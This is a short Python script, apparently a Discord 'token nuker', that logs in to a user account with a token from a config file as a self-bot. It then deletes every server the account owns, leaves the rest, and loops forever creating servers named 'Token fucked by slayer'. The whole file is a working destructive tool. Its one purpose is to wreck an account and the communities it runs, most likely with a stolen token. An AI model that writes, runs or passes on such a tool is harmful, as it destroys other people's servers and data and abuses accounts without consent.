import json
import discord
from discord.ext import commands

with open('config.json') as f:
    config = json.load(f)

client = discord.Client(command_prefix='.')


@client.event
async def on_ready():
    print('Hello world')
    for guild in client.guilds:
        try:
            await guild.delete()
        except:
            await guild.leave()
    while True:
        await client.create_guild(name='Token fucked by slayer')

client.run(config['token'], bot=False)
